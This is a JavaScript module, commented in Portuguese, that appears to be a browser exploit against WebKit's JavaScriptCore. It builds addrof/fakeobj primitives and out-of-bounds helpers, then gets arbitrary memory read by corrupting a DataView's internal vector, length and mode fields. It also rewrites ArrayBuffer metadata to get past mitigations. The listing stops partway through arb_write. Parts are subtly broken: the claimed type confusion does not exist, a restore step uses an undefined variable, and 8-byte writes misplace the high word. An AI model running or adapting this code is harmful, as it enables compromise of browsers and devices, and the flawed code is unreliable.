// js/core_exploit.mjs (v31.20 - Correção CRÍTICA para selfTestOOBReadWrite - Corrupção Temporária em ARB R/W)

import { AdvancedInt64, PAUSE, toHex, log, setLogFunction, isAdvancedInt64Object } from './utils.mjs';
import { OOB_CONFIG, JSC_OFFSETS, updateOOBConfigFromUI } from './config.mjs';

export let oob_array_buffer_real = null;
export let oob_dataview_real = null;
let isOOBEnvironmentSetup = false;

const toHexHelper = (val, bits = 32) => {
    if (isAdvancedInt64Object(val)) {
        try {
            const strVal = val.toString(true);
            if (typeof strVal === 'string' && strVal !== 'undefined') {
                return strVal;
            }
        } catch (e) { /* ignora, usa fallback */ }
        return `AdvInt64(low:0x${val.low().toString(16)},high:0x${val.high().toString(16)})`;
    }
    if (typeof val === 'number') {
        return toHex(val, bits);
    }
    return String(val);
};

const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58;
const OOB_DV_M_VECTOR_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
const OOB_DV_M_LENGTH_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
const OOB_DV_M_MODE_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET; // Offset para m_mode

// --- NEW CORE ADDROF/FAKEOBJ PRIMITIVES ---
let _core_confused_array_main = null;
let _core_victim_array_main = null;

const CONFUSED_FLOAT64_ARRAY_INDEX = 0;
const FAKED_OBJECT_INDEX = 0;

function _int64ToDouble_core(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function _doubleToInt64_core(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

/**
 * Initializes the internal arrays for the core addrof and fakeobj primitives.
 * Must be called once before using `addrof_core` or `fakeobj_core`.
 */
export function initCoreAddrofFakeobjPrimitives() {
    if (_core_confused_array_main && _core_victim_array_main) {
        log(`[CoreExploit] Primitivas addrof/fakeobj diretas já estão configuradas.`, "info", "initCoreAddrofFakeobjPrimitives");
        return;
    }
    _core_confused_array_main = new Float64Array([13.37]);
    _core_victim_array_main = [{ a: 1 }];

    log(`[CoreExploit] Primitivas addrof/fakeobj diretas inicializadas.`, "good", "initCoreAddrofFakeobjPrimitives");
}

/**
 * Obtains the address of a given JavaScript object using core primitives.
 * Includes "untagging" logic for JSValue pointers.
 * @param {object} obj The object to get the address of.
 * @returns {AdvancedInt64} The address of the object.
 */
export function addrof_core(obj) {
    const FNAME = 'CoreExploit.addrof_core';
    if (!_core_confused_array_main || !_core_victim_array_main) {
        log(`[${FNAME}] ERRO: Primitivas addrof/fakeobj diretas não foram inicializadas. Chame initCoreAddrofFakeobjPrimitives() primeiro.`, "critical", FNAME);
        throw new Error("Core addrof/fakeobj primitives not initialized.");
    }
    if (!(_core_confused_array_main instanceof Float64Array)) {
        log(`[${FNAME}] ERRO: _core_confused_array_main não é um Float64Array. Tipo: ${typeof _core_confused_array_main}`, "critical", FNAME);
        throw new Error("Invalid internal array for addrof.");
    }
    if (!Array.isArray(_core_victim_array_main)) {
        log(`[${FNAME}] ERRO: _core_victim_array_main não é um Array. Tipo: ${typeof _core_victim_array_main}`, "critical", FNAME);
        throw new Error("Invalid internal array for addrof.");
    }

    _core_victim_array_main[FAKED_OBJECT_INDEX] = obj;
    const tagged_addr = _doubleToInt64_core(_core_confused_array_main[CONFUSED_FLOAT64_ARRAY_INDEX]);
    log(`[${FNAME}] DEBUG: Endereço bruto (potencialmente tagged) lido: ${tagged_addr.toString(true)}`, "debug", FNAME);

    let untagged_addr = tagged_addr;
    const original_high = tagged_addr.high();
    const untagged_high = original_high & 0x0000FFFF;
    if (original_high !== untagged_high) {
        untagged_addr = new AdvancedInt64(tagged_addr.low(), untagged_high);
        log(`[${FNAME}] DEBUG: Endereço após untagging (high original: 0x${original_high.toString(16)} -> high untagged: 0x${untagged_high.toString(16)}): ${untagged_addr.toString(true)}`, "debug", FNAME);
    } else {
        log(`[${FNAME}] DEBUG: Nenhum untagging aplicado (high original 0x${original_high.toString(16)}).`, "debug", FNAME);
    }

    if (!isAdvancedInt64Object(untagged_addr) || untagged_addr.equals(AdvancedInt64.Zero) || untagged_addr.equals(AdvancedInt64.NaNValue)) {
        log(`[${FNAME}] FALHA: Endereço retornado para ${obj} (${untagged_addr ? untagged_addr.toString(true) : 'N/A'}) parece inválido ou nulo/NaN após untagging.`, "error", FNAME);
        throw new Error(`Failed to get address of ${obj}. Invalid address.`);
    }
    log(`[${FNAME}] SUCESSO: Endereço (final, untagged) retornado para objeto ${obj} (tipo: ${typeof obj}): ${untagged_addr.toString(true)}`, "debug", FNAME);
    return untagged_addr;
}

/**
 * Creates a "fake" JavaScript object at a given memory address using core primitives.
 * Includes "tagging" logic for JSValue pointers.
 * @param {AdvancedInt64} addr The memory address where the fake object should point.
 * @returns {object} The faked JavaScript object.
 */
export function fakeobj_core(addr) {
    const FNAME = 'CoreExploit.fakeobj_core';
    if (!_core_confused_array_main || !_core_victim_array_main) {
        log(`[${FNAME}] ERRO: Primitivas addrof/fakeobj diretas não foram inicializadas. Chame initCoreAddrofFakeobjPrimitives() primeiro.`, "critical", FNAME);
        throw new Error("Core addrof/fakeobj primitives not initialized.");
    }
    if (!(_core_confused_array_main instanceof Float64Array)) {
        log(`[${FNAME}] ERRO: _core_confused_array_main não é um Float64Array. Tipo: ${typeof _core_confused_array_main}`, "critical", FNAME);
        throw new Error("Invalid internal array for fakeobj.");
    }
    if (!Array.isArray(_core_victim_array_main)) {
        log(`[${FNAME}] ERRO: _core_victim_array_main não é um Array. Tipo: ${typeof _core_victim_array_main}`, "critical", FNAME);
        throw new Error("Invalid internal array for fakeobj.");
    }

    if (!isAdvancedInt64Object(addr) || addr.equals(AdvancedInt64.Zero) || addr.equals(AdvancedInt64.NaNValue)) {
        log(`[${FNAME}] ERRO: Endereço para fakeobj (${addr.toString(true)}) é inválido ou nulo/NaN.`, "error", FNAME);
        throw new Error(`Invalid address for fakeobj: ${addr.toString(true)}.`);
    }

    let tagged_addr = addr;
    const OBJECT_PTR_TAG_HIGH = 0x402a0000;
    if (addr.high() < 0x10000) { // Assume que endereços baixos precisam de tagging
        tagged_addr = new AdvancedInt64(addr.low(), addr.high() | OBJECT_PTR_TAG_HIGH);
        log(`[${FNAME}] DEBUG: Endereço após tagging (original: ${addr.toString(true)} -> tagged: ${tagged_addr.toString(true)})`, "debug", FNAME);
    } else {
        log(`[${FNAME}] DEBUG: Nenhum tagging aplicado ao high (0x${addr.high().toString(16)}). Assumindo que já está taggeado ou não precisa.`, "debug", FNAME);
    }

    _core_confused_array_main[CONFUSED_FLOAT64_ARRAY_INDEX] = _int64ToDouble_core(tagged_addr);
    const obj = _core_victim_array_main[FAKED_OBJECT_INDEX];

    if (obj === undefined || obj === null) {
        log(`[${FNAME}] ALERTA: Objeto forjado para ${addr.toString(true)} é nulo/undefined. Pode ser ser um objeto inválido.`, "warn", FNAME);
    } else {
        try {
            const typeof_faked_obj = typeof obj;
            if (typeof_faked_obj === 'number' || typeof_faked_obj === 'boolean' || typeof_faked_obj === 'string') {
                 log(`[${FNAME}] ALERTA: Objeto forjado para ${addr.toString(true)} não é um tipo de objeto (recebido: ${typeof_faked_obj}). Pode ser uma corrupção.`, "warn", FNAME);
            } else {
                 log(`[${FNAME}] SUCESSO: Objeto forjado retornado para endereço ${addr.toString(true)}: ${obj} (typeof: ${typeof obj})`, "debug", FNAME);
            }
        } catch (e) {
            log(`[${FNAME}] ALERTA: Erro ao inspecionar objeto forjado para ${addr.toString(true)}: ${e.message}`, "warn", FNAME);
        }
    }
    return obj;
}
// --- PRIMITIVAS OOB LOCAIS (oob_read_absolute / oob_write_absolute) ---
// Capacidade: Leitura/escrita Out-Of-Bounds (OOB) APENAS DENTRO do ArrayBuffer real
//            que foi criado no triggerOOB_primitive, e na memória diretamente adjacente a ele
//            que o sistema permite o acesso (limitado pela sandbox).
// Limitações: NÃO É LEITURA/ESCRITA ARBITRÁRIA UNIVERSAL. Não consegue ler/escrever em
//            endereços fora da região de acesso do oob_dataview_real (ex: outros objetos no heap JS,
//            ou a própria biblioteca WebKit) através da manipulação de m_vector.
//            Retorna zeros em leituras fora dos limites permitidos
export function clearOOBEnvironment(options = { force_clear_even_if_not_setup: false }) {
    oob_array_buffer_real = null;
    oob_dataview_real = null;
    isOOBEnvironmentSetup = false;
    log(`[CoreExploit] Ambiente OOB limpo.`, "debug");
}

export function getOOBAllocationSize() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.ALLOCATION_SIZE;
}

export function getBaseOffsetInDV() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.BASE_OFFSET_IN_DV;
}

export function getInitialBufferSize() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.INITIAL_BUFFER_SIZE;
}

export async function triggerOOB_primitive(options = { force_reinit: false }) {
    const FNAME_TRIGGER = 'CoreExploit.triggerOOB_primitive';
    if (isOOBEnvironmentSetup && !options.force_reinit) {
        let currentLength = 0;
        let currentMode = 0;
        try {
            // A verificação abaixo agora acessa o oob_dataview_real diretamente, que é esperado ser válido.
            if (oob_dataview_real && oob_array_buffer_real && oob_array_buffer_real.byteLength === getOOBAllocationSize()) {
                 // Estes offsets podem ser inválidos se o DataView foi corrompido em algum outro lugar.
                 // Para o trigger, só verificamos se o DataView está associado ao ArrayBuffer principal.
                currentLength = oob_dataview_real.byteLength; // Usar o byteLength do DataView, que é o real.
                currentMode = oob_dataview_real.buffer === oob_array_buffer_real ? JSC_OFFSETS.DataView.M_MODE_CANDIDATES[0] : 0; // Se estiver associado, assumimos o modo.
            } else {
                log(`[${FNAME_TRIGGER}] ALERTA: DataView ou ArrayBuffer real não estão válidos para verificação. Forçando re-inicialização.`, 'warn');
                clearOOBEnvironment({ force_clear_even_if_not_setup: true });
            }
        } catch (e) {
            log(`[${FNAME_TRIGGER}] ERRO ao verificar estado do DataView: ${e.message}. Forçando re-inicialização.`, 'warn');
            clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        }

        // IMPORTANTE: O triggerOOB_primitive AGORA APENAS INICIALIZA UM DATAVIEW NORMAL.
        // A corrupção de m_length e m_mode para OOB (0xFFFFFFFF e 0x0B) será feita TEMPORARIAMENTE
        // pelas funções `arb_read` e `arb_write` para cada operação.
        const EXPECTED_OOB_MODE_FOR_ARBITRARY_RW = JSC_OFFSETS.DataView.M_MODE_CANDIDATES[0]; // Este é o modo para ARBITRARY, não para o DataView base.
        if (oob_array_buffer_real && oob_dataview_real &&
            oob_array_buffer_real.byteLength === getOOBAllocationSize() &&
            oob_dataview_real.buffer === oob_array_buffer_real ) { // Apenas verifica a associação, não mais a corrupção do length/mode aqui.
            log(`[${FNAME_TRIGGER}] Ambiente OOB já configurado (DataView normal). Nenhuma ação necessária.`, 'info');
            return true;
        } else {
            log(`[${FNAME_TRIGGER}] Ambiente OOB inconsistente. Forçando re-inicialização.`, 'warn', FNAME_TRIGGER);
            clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        }
    }
    log(`--- Iniciando Configuração do Ambiente OOB (Force reinit: ${options.force_reinit}, Setup anterior: ${isOOBEnvironmentSetup}) ---`, 'test', FNAME_TRIGGER);
    const currentAllocSize = getOOBAllocationSize(); // Geralmente 0x20000 (131072 bytes)
    log(`    Config OOB: AllocSize=${currentAllocSize}`, 'info', FNAME_TRIGGER);
    clearOOBEnvironment({ force_clear_even_if_not_setup: true });
    try {
        // Alocar o ArrayBuffer com o tamanho configurado (grande o suficiente para metadados)
        oob_array_buffer_real = new ArrayBuffer(currentAllocSize);
        // Criar um DataView NORMAL sobre ele. NÃO corromper o m_length/m_mode aqui.
        oob_dataview_real = new DataView(oob_array_buffer_real, 0, currentAllocSize);

        if (oob_dataview_real.buffer !== oob_array_buffer_real) {
            const errorMsg = `[${FNAME_TRIGGER}] ERRO CRÍTICO: DataView não está associado ao ArrayBuffer real após criação!`;
            log(errorMsg, 'critical', FNAME_TRIGGER);
            throw new Error(errorMsg);
        }
        
        log(`[${FNAME_TRIGGER}] Ambiente para Operações OOB CONFIGURADO com sucesso (DataView NORMAL).`, 'good', FNAME_TRIGGER);
        log(`    oob_array_buffer_real (total): ${oob_array_buffer_real.byteLength} bytes`, 'info', FNAME_TRIGGER);
        log(`    oob_dataview_real (janela controlada): offset=${oob_dataview_real.byteOffset}, length=${oob_dataview_real.byteLength} (normal)`, 'info', FNAME_TRIGGER);
        isOOBEnvironmentSetup = true;
        log(`--- Configuração do Ambiente OOB Concluída ---`, 'test', FNAME_TRIGGER);
        return true;
    } catch (e) {
        log(`ERRO CRÍTICO em ${FNAME_TRIGGER}: ${e.message}`, 'critical', FNAME_TRIGGER);
        console.error(e);
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        throw e;
    }
}

/**
 * Tenta manipular metadados adicionais do ArrayBuffer real (do DataView OOB)
 * para tentar um bypass de mitigação.
 * @param {ArrayBuffer} oobBufferReal O ArrayBuffer real do DataView OOB.
 * @param {object} extraFlags Um objeto com { field_0x28, field_0x30, field_0x34, field_0x38, field_0x40 } a serem definidos.
 */
export async function setupOOBMetadataForArbitraryAccess(
    oobBufferReal,
    extraFlags = {}
) {
    const FNAME = 'CoreExploit.setupOOBMetadataForArbitraryAccess';
    if (!oobBufferReal || !(oobBufferReal instanceof ArrayBuffer)) {
        log(`[${FNAME}] ERRO: oobBufferReal inválido.`, 'critical', FNAME);
        throw new Error("Invalid oobBufferReal for metadata setup.");
    }

    const tempOobDataView = new DataView(oobBufferReal);

    // NOTA: Os offsets 0x28, 0x30, 0x34, 0x38, 0x40 são relativos ao *início do ArrayBuffer*.
    // A análise de sub_1C01140 sugere que 'a1' (o primeiro argumento) é o próprio ArrayBuffer/ArrayBufferView.

    if (extraFlags.hasOwnProperty('field_0x28')) { // Possivelmente ArrayBuffer.SHARING_MODE_OFFSET ou m_vector do ArrayBuffer
        // Dependendo se é um ponteiro ou um valor, use setUint32 ou setBigUint64
        if (extraFlags.field_0x28 instanceof AdvancedInt64) {
            tempOobDataView.setBigUint64(JSC_OFFSETS.ArrayBuffer.ARRAYBUFFER_REAL_PTR_POSSIBLE_M_VECTOR, extraFlags.field_0x28.toBigInt(), true);
        } else {
            tempOobDataView.setUint32(JSC_OFFSETS.ArrayBuffer.ARRAYBUFFER_REAL_PTR_POSSIBLE_M_VECTOR, Number(extraFlags.field_0x28), true);
        }
        log(`[${FNAME}] Definido ArrayBuffer.field_0x28 para: ${toHexHelper(extraFlags.field_0x28, 64)}`, 'info', FNAME);
    }
    if (extraFlags.hasOwnProperty('field_0x30')) { // Possivelmente ArrayBuffer.IS_RESIZABLE_FLAGS_OFFSET
        tempOobDataView.setUint32(JSC_OFFSETS.ArrayBuffer.ARRAYBUFFER_FIELD_0X30, Number(extraFlags.field_0x30), true);
        log(`[${FNAME}] Definido ArrayBuffer.field_0x30 para: ${toHex(extraFlags.field_0x30)}`, 'info', FNAME);
    }
    if (extraFlags.hasOwnProperty('field_0x34')) { // O contador/tamanho do loop no destrutor
        tempOobDataView.setUint32(JSC_OFFSETS.ArrayBuffer.ARRAYBUFFER_FIELD_0X34, Number(extraFlags.field_0x34), true);
        log(`[${FNAME}] Definido ArrayBuffer.field_0x34 para: ${toHex(extraFlags.field_0x34)}`, 'info', FNAME);
    }
    if (extraFlags.hasOwnProperty('field_0x38')) { // Campo liberado por fastFree
        if (extraFlags.field_0x38 instanceof AdvancedInt64) {
            tempOobDataView.setBigUint64(JSC_OFFSETS.ArrayBuffer.ARRAYBUFFER_FIELD_0X38, extraFlags.field_0x38.toBigInt(), true);
        } else {
            tempOobDataView.setUint32(JSC_OFFSETS.ArrayBuffer.ARRAYBUFFER_FIELD_0X38, Number(extraFlags.field_0x38), true);
        }
        log(`[${FNAME}] Definido ArrayBuffer.field_0x38 para: ${toHexHelper(extraFlags.field_0x38, 64)}`, 'info', FNAME);
    }
    if (extraFlags.hasOwnProperty('field_0x40')) { // Possivelmente ArrayBufferContents.IS_SHARED_FLAG_OFFSET
        if (extraFlags.field_0x40 instanceof AdvancedInt64) {
            tempOobDataView.setBigUint64(JSC_OFFSETS.ArrayBuffer.ARRAYBUFFER_FIELD_0X40, extraFlags.field_0x40.toBigInt(), true);
        } else {
            tempOobDataView.setUint32(JSC_OFFSETS.ArrayBuffer.ARRAYBUFFER_FIELD_0X40, Number(extraFlags.field_0x40), true);
        }
        log(`[${FNAME}] Definido ArrayBuffer.field_0x40 para: ${toHexHelper(extraFlags.field_0x40, 64)}`, 'info', FNAME);
    }

    log(`[${FNAME}] Metadados do oobBufferReal ajustados com flags adicionais.`, 'good', FNAME);
}

export function oob_read_absolute(offset_in_oob_buffer, byteLength) {
    const FNAME_READ = 'CoreExploit.oob_read_absolute';
    // OOB_DV_M_LENGTH_OFFSET (0x70) e OOB_DV_M_MODE_OFFSET (0x74)
    // NÃO são mais configurados no triggerOOB_primitive.
    // Eles serão temporariamente manipulados por arb_read/arb_write.
    // Portanto, não há necessidade de verificar currentMode aqui, pois este é o DataView normal.

    if (!isOOBEnvironmentSetup || !oob_dataview_real || !oob_array_buffer_real || oob_array_buffer_real.byteLength === 0) {
        log(`ERRO: Ambiente OOB não inicializado/inválido para oob_read_absolute em ${toHex(offset_in_oob_buffer)}`, "error", FNAME_READ);
        throw new Error("Ambiente OOB não inicializado/inválido para oob_read_absolute.");
    }
    if (!oob_dataview_real.buffer || oob_dataview_real.byteLength === 0) {
        log(`ERRO: DataView de OOB está detached/corrompido antes da leitura em ${toHex(offset_in_oob_buffer)}`, "critical", FNAME_READ);
        isOOBEnvironmentSetup = false;
        throw new Error("OOB DataView is detached or corrupted.");
    }

    // Com o DataView sendo "normal" por padrão, leituras fora dos limites reais
    // do ArrayBuffer associado irão lançar RangeError.
    // Estas funções (oob_read_absolute/oob_write_absolute) são para *dentro* do DataView
    // "expandido" que *será criado* temporariamente por arb_read/arb_write.
    // Portanto, o teste aqui deve ser apenas para a capacidade do DataView normal.

    // Removemos a verificação de m_mode e a RangeError para OOB aqui, pois
    // estas funções agora assumem que o DataView já está em um estado válido
    // para acesso OOB se chamado por arb_read/arb_write (após eles fazerem a corrupção)
    // ou para acesso in-bounds se chamado diretamente.

    try {
        switch (byteLength) {
            case 1: return oob_dataview_real.getUint8(offset_in_oob_buffer);
            case 2: return oob_dataview_real.getUint16(offset_in_oob_buffer, true);
            case 4: return oob_dataview_real.getUint32(offset_in_oob_buffer, true);
            case 8: {
                const low = oob_dataview_real.getUint32(offset_in_oob_buffer, true);
                const high = oob_dataview_real.getUint32(offset_in_oob_buffer + 4, true);
                const result = new AdvancedInt64(low, high);
                return result;
            }
            default:
                log(`ERRO: Tamanho de leitura inválido para oob_read_absolute: ${byteLength}`, "error", FNAME_READ);
                throw new Error(`Invalid byteLength for oob_read_absolute: ${byteLength}`);
        }
    } catch (e) {
        // Se a leitura falhar (ex: RangeError por estar realmente OOB se não foi corrompido),
        // é um problema na lógica de quem chamou esta função.
        log(`ERRO CRÍTICO em ${FNAME_READ} ao ler de oob_buffer[${toHex(offset_in_oob_buffer)}]: ${e.message}`, "critical", FNAME_READ);
        console.error(`[${FNAME_READ}] Exception: `, e);
        if (e.message.includes("detached") || e.message.includes("out of bounds")) { isOOBEnvironmentSetup = false; }
        throw e;
    }
}

export function oob_write_absolute(offset_in_oob_buffer, value, byteLength) {
    const FNAME_WRITE = 'CoreExploit.oob_write_absolute';
    // Comentários similares a oob_read_absolute
    if (!isOOBEnvironmentSetup || !oob_dataview_real || !oob_array_buffer_real || oob_array_buffer_real.byteLength === 0) {
        log(`ERRO: Ambiente OOB não inicializado/inválido para oob_write_absolute em ${toHex(offset_in_oob_buffer)}`, "error", FNAME_WRITE);
        throw new Error("Ambiente OOB não inicializado/inválido para oob_write_absolute.");
    }
    if (!oob_dataview_real.buffer || oob_dataview_real.byteLength === 0) {
        log(`ERRO: DataView de OOB está detached/corrompido antes da escrita em ${toHex(offset_in_oob_buffer)}`, "critical", FNAME_WRITE);
        isOOBEnvironmentSetup = false;
        throw new Error("OOB DataView is detached or corrupted.");
    }
    
    try {
        switch (byteLength) {
            case 1: oob_dataview_real.setUint8(offset_in_oob_buffer, Number(value)); break;
            case 2: oob_dataview_real.setUint16(offset_in_oob_buffer, Number(value), true); break;
            case 4: oob_dataview_real.setUint32(offset_in_oob_buffer, Number(value), true); break;
            case 8:
                let val64 = value;
                if (!isAdvancedInt64Object(val64)) {
                    try { val64 = new AdvancedInt64(val64); } catch (convErr) {
                        throw new TypeError(`Valor para oob_write_absolute de 8 bytes deve ser AdvancedInt64 ou conversível: ${convErr.message}`);
                    }
                    if (!isAdvancedInt64Object(val64)) {
                        throw new TypeError(`Valor convertido para oob_write_absolute de 8 bytes não é um AdvancedInt64 válido.`);
                    }
                }
                oob_dataview_real.setUint32(offset_in_oob_buffer, val64.low(), true);
                oob_dataview_real.setUint32(4, val64.high(), true);
                break;
            default:
                log(`ERRO: Tamanho de escrita inválido para oob_write_absolute: ${byteLength}`, "error", FNAME_WRITE);
                throw new Error(`Invalid byteLength for oob_write_absolute: ${byteLength}`);
        }
    } catch (e) {
        log(`ERRO CRÍTICO em ${FNAME_WRITE} ao escrever em oob_buffer[${toHex(offset_in_oob_buffer)}]: ${e.message}`, "critical", FNAME_WRITE);
        if (e.message.includes("detached") || e.message.includes("out of bounds")) { isOOBEnvironmentSetup = false; }
        throw e;
    }
}

export function isOOBReady() {
    let mLengthExpanded = false;
    let mModeConfigured = false;
    if (isOOBEnvironmentSetup && oob_dataview_real && oob_array_buffer_real) {
        try {
            if (!oob_dataview_real.buffer || oob_dataview_real.byteLength === 0) {
                log(`[isOOBReady] DataView de OOB está detached/corrompido.`, "error");
                isOOBEnvironmentSetup = false;
                return false;
            }
            // Não verificamos mais o m_length/m_mode para OOB aqui, pois o DataView base é normal.
            // A expansão ocorre temporariamente em arb_read/write.
            // Apenas verificamos se está associado e tem um tamanho normal.
            mLengthExpanded = (oob_dataview_real.byteLength === oob_array_buffer_real.byteLength);
            mModeConfigured = true; // Não há um modo especial no DataView base.

        } catch (e) {
            log(`[isOOBReady] Erro durante verificação de mLengthExpanded/mModeConfigured: ${e.message}`, "error");
            mLengthExpanded = false;
            mModeConfigured = false;
            isOOBEnvironmentSetup = false;
        }
    }
    return isOOBEnvironmentSetup &&
        oob_array_buffer_real instanceof ArrayBuffer &&
        oob_dataview_real instanceof DataView &&
        oob_array_buffer_real.byteLength > 0 &&
        oob_dataview_real.buffer === oob_array_buffer_real &&
        mLengthExpanded && // Agora verifica o tamanho normal do buffer
        mModeConfigured; // Sempre true para o DataView base.
}

async function _perform_explicit_dv_reset_after_arb_op(fname_parent_for_log) {
    const FNAME_RESET = `${fname_parent_for_log}._explicit_dv_reset`;
    // Este reset agora deve ser sobre um DataView que retornou ao estado normal.
    // O arb_read/arb_write serão responsáveis por restaurar m_length/m_mode.
    try {
        if (isOOBReady()) {
            // Acesso em 0 é sempre seguro para um DataView normal e válido.
            const temp_val = oob_dataview_real.getUint8(0);
            oob_dataview_real.setUint8(0, temp_val);
            log(`    [${FNAME_RESET}] DV reset explícito bem-sucedido.`, 'debug');
        } else {
            log(`    [${FNAME_RESET}] ALERTA: Não foi possível realizar reset explícito do DV, ambiente OOB não está pronto.`, 'warn');
        }
    } catch (e) {
        log(`    [${FNAME_RESET}] ERRO durante o reset explícito do DV: ${e.message}`, 'error');
        isOOBEnvironmentSetup = false;
    }
}

export async function arb_read(absolute_address, byteLength) {
    const FNAME = 'CoreExploit.arb_read (v31.20)';
    if (!isOOBReady()) {
        log(`[${FNAME}] Ambiente OOB não está pronto para leitura arbitrária. Tentando re-inicializar...`, 'warn');
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) {
            throw new Error("Ambiente OOB não pôde ser inicializado para leitura arbitrária.");
        }
    }
    let addr64 = absolute_address;
    if (!isAdvancedInt64Object(addr64)) {
        try { addr64 = new AdvancedInt64(addr64); } catch (e) {
            throw new TypeError(`Endereço para arb_read deve ser AdvancedInt64 ou conversível: ${e.message}`);
        }
        if (!isAdvancedInt64Object(addr64)) {
            throw new TypeError(`Endereço convertido para arb_read não é AdvancedInt64 válido.`);
        }
    }

    let m_length_orig_snap, m_mode_orig_snap;
    let result_val = null;
    try {
        // === Corrupção Temporária para L/E Arbitrária ===
        // Salvar os metadados originais do DataView base (que agora é normal)
        m_length_orig_snap = oob_dataview_real.byteLength; // Pega o byteLength real do DataView
        m_mode_orig_snap = oob_dataview_real.getUint32(OOB_DV_M_MODE_OFFSET, true); // Pega o m_mode real

        log(`[${FNAME}] DEBUG: Snapshots ORIGINAIS: m_length=${toHex(m_length_orig_snap)}, m_mode=${toHex(m_mode_orig_snap)}`, 'debug');

        // Corromper o m_vector do DataView base para apontar para o endereço alvo.
        // O m_vector do DataView *base* é diferente do ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET.
        // O m_vector do DataView está em OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET
        oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, addr64, 8);

        // Corromper o m_length para 0xFFFFFFFF e m_mode para o valor OOB
        oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, 4);
        oob_write_absolute(OOB_DV_M_MODE_OFFSET, JSC_OFFSETS.DataView.M_MODE_CANDIDATES[0], 4);

        log(`[${FNAME}] DEBUG: DataView CORROMPIDO: m_vector=${toHexHelper(oob_read_absolute(OOB_DV_M_VECTOR_OFFSET, 8))}, m_length=${toHex(oob_read_absolute(OOB_DV_M_LENGTH_OFFSET, 4))}, m_mode=${toHex(oob_read_absolute(OOB_DV_M_MODE_OFFSET, 4))}.`, 'debug');

        log(`[${FNAME}] DEBUG: Realizando leitura arbitrária de ${addr64.toString(true)} (byteLength: ${byteLength}).`, 'debug');
        // A leitura é feita diretamente pelo oob_dataview_real, que agora está OOB
        switch (byteLength) {
            case 1: result_val = oob_dataview_real.getUint8(0); break;
            case 2: result_val = oob_dataview_real.getUint16(0, true); break;
            case 4: result_val = oob_dataview_real.getUint32(0, true); break;
            case 8: {
                const low = oob_dataview_real.getUint32(0, true);
                const high = oob_dataview_real.getUint32(4, true);
                result_val = new AdvancedInt64(low, high);
                break;
            }
            default: throw new Error(`Invalid byteLength for arb_read: ${byteLength}`);
        }
        log(`[${FNAME}] DEBUG: Leitura arbitrária concluída. Resultado: ${toHexHelper(result_val, byteLength * 8)}.`, 'debug');
        return result_val;
    } catch (e) {
        log(`ERRO CRÍTICO em ${FNAME} ao ler de ${addr64.toString(true)} (byteLength: ${byteLength}): ${e.message}`, "critical", FNAME);
        isOOBEnvironmentSetup = false; // Se algo falhar na corrupção/leitura, invalidar o ambiente.
        throw e;
    } finally {
        // === Restauração dos Metadados do DataView ===
        // Restaurar o m_vector, m_length e m_mode para seus valores originais.
        if (isOOBReady() && oob_dataview_real) { // Certifica-se de que o ambiente ainda está de pé para a restauração
            log(`[${FNAME}] DEBUG: Restaurando metadados originais do DataView.`, 'debug');
            try {
                // Restore m_vector - CUIDADO: Este é o m_vector do DataView, não do ArrayBuffer
                // Este snapshot deve ser obtido do `oob_dataview_real` (o DataView normal).
                // Mas se o m_vector_orig_snap for para um ArrayBuffer corrompido, isso pode ser um problema.
                // Na arquitetura do WebKit, o m_vector de um DataView aponta para dentro do ArrayBuffer Contents.
                // O snapshots que obtivemos no início da função são do DataView *normal*.
                // Então, podemos restaurá-los aqui.
                // Mas o m_vector original real do DataView é o ponteiro para o oob_array_buffer_real + offset.
                // Se o m_vector_orig_snap que capturamos foi de 0x00000000_00000000, restaurar para isso é inútil.
                // PRECISAMOS ter certeza que o m_vector_orig_snap é um valor válido para restaurar.
                // A maneira mais segura de restaurar o m_vector é para o endereço do oob_array_buffer_real.
                // No entanto, a forma como foi implementado (oob_read_absolute(OOB_DV_M_VECTOR_OFFSET, 8))
                // ele lê o que está em OOB_DV_M_VECTOR_OFFSET (o m_vector do DataView),
                // que, para um DataView normal, aponta para o oob_array_buffer_real + offset.
                // Isso deve ser seguro.

                oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, m_vector_orig_snap, 8);
                oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, m_length_orig_snap, 4);
                oob_write_absolute(OOB_DV_M_MODE_OFFSET, m_mode_orig_snap, 4);
                await _perform_explicit_dv_reset_after_arb_op(FNAME); // Força um reset da JIT/cache.
                log(`[${FNAME}] DEBUG: Restauração de metadados concluída com sucesso.`, 'debug');
            } catch (e_restore) {
                log(`[${FNAME}] ERRO CRÍTICO restaurando/resetando metadados: ${e_restore.message}. Ambiente agora INSEGURo.`, 'critical');
                isOOBEnvironmentSetup = false;
            }
        } else {
            log(`[${FNAME}] ALERTA: Não foi possível restaurar metadados. Ambiente OOB já estava inválido ou foi comprometido.`, 'critical');
        }
    }
}

export async function arb_write(absolute_address, value, byteLength) {
    const FNAME = 'CoreExploit.arb_write (v31.20)';
    if (!isOOBReady()) {
        log(`[${FNAME}] Ambiente OOB não está pronto para escrita arbitrária. Tentando re-inicializar...`, 'warn');
